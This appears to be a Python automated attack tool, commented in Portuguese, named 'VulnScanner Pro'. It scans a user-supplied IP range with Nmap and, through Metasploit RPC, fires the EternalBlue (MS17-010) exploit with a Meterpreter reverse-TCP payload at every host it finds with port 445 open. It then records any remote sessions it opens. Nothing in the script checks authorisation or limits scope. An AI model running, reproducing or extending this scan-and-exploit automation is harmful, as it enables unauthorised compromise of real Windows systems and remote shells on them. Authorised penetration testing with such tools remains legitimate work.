import nmap
import time
import sys
import logging
from datetime import datetime
from metasploit.msfrpc import MsfRpcClient, MsfRpcError

class VulnScannerPro:
    def __init__(self, target, msf_password, msf_host='127.0.0.1', msf_port=55553):
        """
        Inicializa o scanner com o alvo, conexão ao Metasploit RPC,
        configura logger e prepara arquivo de relatório.
        """
        self.target = target
        self.nm = nmap.PortScanner()
        self.msf_password = msf_password
        self.msf_host = msf_host
        self.msf_port = msf_port
        self.client = None

        # Configuração do logger
        log_filename = f'vulnscanner_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        logging.basicConfig(
            filename=log_filename,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger()
        self.logger.info("VulnScanner Pro iniciado")

        # Arquivo de relatório
        self.report_filename = f'report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
        with open(self.report_filename, 'w') as f:
            f.write(f"Relatório VulnScanner Pro - {datetime.now()}\n")
            f.write(f"Alvo: {self.target}\n\n")

    def connect_msf(self, max_retries=5, wait_seconds=5):
        """
        Tenta conectar ao Metasploit RPC com retries.
        """
        for attempt in range(max_retries):
            try:
                self.logger.info(f"Tentando conectar ao Metasploit RPC ({self.msf_host}:{self.msf_port}) - tentativa {attempt+1}")
                self.client = MsfRpcClient(self.msf_password, server=self.msf_host, port=self.msf_port, ssl=False)
                self.logger.info("Conectado ao Metasploit RPC com sucesso")
                return True
            except MsfRpcError as e:
                self.logger.error(f"Erro ao conectar ao Metasploit RPC: {e}")
                time.sleep(wait_seconds)
        self.logger.error("Falha ao conectar ao Metasploit RPC após várias tentativas")
        return False

    def scan_network(self):
        """
        Executa varredura Nmap no alvo com detecção de portas, serviços e SO.
        """
        self.logger.info(f"Iniciando varredura Nmap no alvo: {self.target}")
        try:
            self.nm.scan(self.target, arguments='-sS -sV -O --max-retries 2 --host-timeout 30s')
        except Exception as e:
            self.logger.error(f"Erro durante a varredura Nmap: {e}")
            sys.exit(1)

        hosts = self.nm.all_hosts()
        self.logger.info(f"Varredura concluída. Hosts encontrados: {len(hosts)}")
        return hosts

    def print_scan_results(self, hosts):
        """
        Exibe e salva os resultados da varredura Nmap de forma detalhada.
        """
        with open(self.report_filename, 'a') as f:
            for host in hosts:
                header = f"\nHost: {host} ({self.nm[host].hostname()})"
                state = f"Estado: {self.nm[host].state()}"
                self.logger.info(header)
                self.logger.info(state)
                f.write(header + '\n')
                f.write(state + '\n')

                for proto in self.nm[host].all_protocols():
                    proto_line = f"Protocolo: {proto}"
                    self.logger.info(proto_line)
                    f.write(proto_line + '\n')
                    ports = self.nm[host][proto].keys()
                    for port in sorted(ports):
                        port_info = self.nm[host][proto][port]
                        line = f"Porta: {port}\tEstado: {port_info['state']}\tServiço: {port_info['name']}\tVersão: {port_info.get('version', '')}"
                        self.logger.info(line)
                        f.write(line + '\n')

                osmatch = self.nm[host]['osmatch']
                os_line = f"Sistema Operacional: {osmatch[0]['name'] if osmatch else 'Desconhecido'}"
                self.logger.info(os_line)
                f.write(os_line + '\n')

    def run_exploit(self, host, port, exploit_name, payload_name, lhost, lport):
        """
        Executa um exploit do Metasploit contra o host e porta especificados,
        registra logs e adiciona ao relatório.
        """
        self.logger.info(f"Executando exploit {exploit_name} contra {host}:{port}")
        with open(self.report_filename, 'a') as f:
            f.write(f"\nExecutando exploit {exploit_name} contra {host}:{port}\n")

        try:
            exploit = self.client.modules.use('exploit', exploit_name)
            payload = self.client.modules.use('payload', payload_name)

            # Configura parâmetros do exploit
            exploit['RHOSTS'] = host
            exploit['RPORT'] = port
            exploit['PAYLOAD'] = payload_name
            exploit['LHOST'] = lhost
            exploit['LPORT'] = lport

            # Executa o exploit
            job_id = exploit.execute(payload=payload_name)
            self.logger.info(f"Exploit iniciado com job ID: {job_id}")
            with open(self.report_filename, 'a') as f:
                f.write(f"Exploit iniciado com job ID: {job_id}\n")

            # Aguarda um tempo para o exploit tentar abrir sessão
            time.sleep(15)

            sessions = self.client.sessions.list
            if sessions:
                self.logger.info(f"Sessões abertas: {sessions}")
                with open(self.report_filename, 'a') as f:
                    f.write(f"Sessões abertas: {sessions}\n")
            else:
                self.logger.warning("Nenhuma sessão aberta após o exploit.")
                with open(self.report_filename, 'a') as f:
                    f.write("Nenhuma sessão aberta após o exploit.\n")
        except MsfRpcError as e:
            self.logger.error(f"Erro ao executar exploit: {e}")
            with open(self.report_filename, 'a') as f:
                f.write(f"Erro ao executar exploit: {e}\n")

    def run(self):
        """
        Fluxo principal: conecta ao Metasploit, faz varredura e executa exploits.
        """
        if not self.connect_msf():
            sys.exit(1)

        hosts = self.scan_network()
        self.print_scan_results(hosts)

        # Exemplo: executar exploit em portas abertas encontradas
        for host in hosts:
            for proto in self.nm[host].all_protocols():
                for port in self.nm[host][proto].keys():
                    port_info = self.nm[host][proto][port]
                    if port_info['state'] == 'open':
                        # Aqui você pode implementar lógica para escolher exploits adequados
                        # Exemplo fixo para MS17-010 (EternalBlue) em SMB (porta 445)
                        if port == 445:
                            exploit_name = 'exploit/windows/smb/ms17_010_eternalblue'
                            payload_name = 'windows/x64/meterpreter/reverse_tcp'
                            lhost = '0.0.0.0'  # Ajuste para seu IP de callback
                            lport = 4444       # Ajuste para sua porta de callback
                            self.run_exploit(host, port, exploit_name, payload_name, lhost, lport)
                            return  # Remove se quiser testar múltiplos hosts/portas

if __name__ == "__main__":
    target_ip = input("Informe o IP ou range alvo: ").strip()
    msf_pass = input("Informe a senha do Metasploit RPC: ").strip()
    scanner = VulnScannerPro(target_ip, msf_pass)
    scanner.run()